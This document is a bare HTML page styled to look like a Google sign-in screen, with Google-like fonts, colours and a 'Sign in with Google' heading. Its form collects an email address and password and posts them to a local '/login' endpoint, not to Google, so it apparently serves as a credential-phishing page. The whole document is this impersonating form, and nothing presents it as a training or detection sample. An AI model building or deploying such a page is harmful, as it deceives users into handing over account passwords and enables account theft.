<!DOCTYPE html>
<html>
<head>
<title>Google Sign In</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Roboto, Arial, sans-serif; background: #ffffff; }
form { background: white; padding: 20px; margin: 50px auto; width: 90%; max-width: 350px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
input { width: 100%; padding: 12px; margin: 8px 0; }
button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; font-size: 16px; }
</style>
</head>
<body>
<form action="/login" method="POST">
<h2>Sign in with Google</h2>
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
</body>
</html>
